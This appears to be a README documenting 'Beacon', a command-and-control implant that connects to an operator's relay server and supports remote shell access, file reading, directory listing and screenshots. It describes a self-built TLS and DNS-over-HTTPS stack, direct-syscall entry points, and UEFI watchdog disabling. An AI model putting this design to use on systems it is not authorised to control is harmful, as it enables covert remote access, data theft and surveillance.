[< Back to Source](../README.md) | [< Back to Project Root](../../README.md)

# Beacon

Top-level application layer — connects to a relay server over WebSocket (TLS 1.3 over HTTPS) and dispatches commands from the operator.

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                          Beacon                              │
│                                                              │
│  entry_point() → DNS resolve → TLS handshake → WebSocket    │
│       │                                            │         │
│       │         ┌──────────────────────────────────┘         │
│       │         │ Message Loop                               │
│       │         │                                            │
│       │         ├─ Read WebSocket message                    │
│       │         ├─ Dispatch to command handler               │
│       │         ├─ Send response                             │
│       │         └─ Loop (reconnect on failure)               │
│       │                                                      │
│  ┌────┴────────────────────────────────────────────────┐     │
│  │              Command Handlers                        │     │
│  ├─ GetSystemInfo      → SystemInfo struct              │     │
│  ├─ GetDirectoryContent → DirectoryIterator             │     │
│  ├─ GetFileContent      → File::Open + Read             │     │
│  ├─ WriteShell          → ShellProcess::Write           │     │
│  ├─ ReadShell           → ShellProcess::Read            │     │
│  ├─ GetDisplays         → Screen::GetDevices            │     │
│  └─ GetScreenshot       → Screen::Capture + JPEG encode │     │
│                                                              │
└──────────────────────┬───────────────────────────────────────┘
                       │
              ┌────────┴────────┐
              │   Platform Layer │
              │ (syscalls/protos)│
              └─────────────────┘
```

## Connection Pipeline

Full protocol stack, all implemented in-process:

```
1. DNS-over-HTTPS resolution
   └─ Builds RFC 1035 query, sends via HTTPS POST to 1.1.1.1/dns-query
      (or 8.8.8.8 as fallback)

2. TCP connection
   └─ Socket::Create + Socket::Open (5-second timeout)

3. TLS 1.3 handshake
   └─ ECDH key exchange (P-256/P-384), ChaCha20-Poly1305 cipher
      Full handshake: ClientHello → ServerHello → encrypted traffic

4. HTTP/1.1 upgrade
   └─ GET /agent with Upgrade: websocket header
      Sec-WebSocket-Key + SHA-1 challenge-response

5. WebSocket message loop
   └─ Binary frames with command dispatch
```

Every layer implemented from scratch in `src/lib/` — no OpenSSL, no libcurl, no system TLS.

## Command Dispatch

Commands are dispatched via a function pointer array indexed by command type:

```c
typedef Result<void, Error> (*CommandHandler)(WebSocketClient&, Span<UINT8> payload);
CommandHandler handlers[] = {
    HandleGetSystemInfo,        // 0
    HandleGetDirectoryContent,  // 1
    HandleGetFileContent,       // 2
    HandleWriteShell,           // 3
    HandleReadShell,            // 4
    HandleGetDisplays,          // 5
    HandleGetScreenshot,        // 6
};
```

### Command: GetScreenshot

The most complex command — chains multiple subsystems:

```
Screen::Capture(device, rgbBuffer)     → raw RGB pixels
  │
  JpegEncoder::Encode(rgb, w, h, quality, writer)
  │                                      │
  │  8×8 blocks → DCT → quantize → Huffman → JFIF bitstream
  │                                      │
  └──────────────────────────────────────┘
  │
  WebSocket::Send(jpegData)            → send compressed frame
```

The JPEG encoder streams output via callback — no intermediate buffer for the full compressed image.

### Command: Shell (Write/Read)

Interactive shell access using the platform's `ShellProcess`:

- **POSIX**: `/bin/sh` running in a PTY (single fd for stdin+stdout)
- **Windows**: `cmd.exe` with three anonymous pipes (stdin, stdout, stderr)

`WriteShell` sends operator input to the shell's stdin. `ReadShell` polls for output and returns whatever is available (non-blocking via `Poll`).

## Entry Point

**File:** `src/entry_point.cc`

The unified entry point handles platform-specific initialization:

### UEFI

```c
EFI_STATUS EfiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_CONTEXT ctx;
    ctx.ImageHandle = ImageHandle;
    ctx.SystemTable = SystemTable;
    StoreContext(&ctx);           // WRMSR (x86_64) or MSR TPIDR_EL0 (ARM64)
    SystemTable->BootServices->SetWatchdogTimer(0, 0, 0, NULL);  // disable 5-min watchdog
    BeaconMain();
}
```

The EFI context is stored in a CPU register (not a global — no data sections exist) so all subsequent code can access `ImageHandle` and `SystemTable`.

### POSIX

```c
__attribute__((force_align_arg_pointer))  // re-align RSP (no CALL pushed return address)
void _start() {
    BeaconMain();
    System::Call(SYS_EXIT_GROUP, 0);      // direct syscall, no atexit handlers
}
```

### Windows

```c
void entry_point() {
    BeaconMain();
    NTDLL::ZwTerminateProcess((PVOID)-1, 0);  // -1 = NtCurrentProcess()
}
```

## Reconnection

On WebSocket disconnection, the beacon re-enters the full connection pipeline (DNS → TCP → TLS → HTTP → WebSocket). No cached state from previous connections — each reconnection is a clean start.
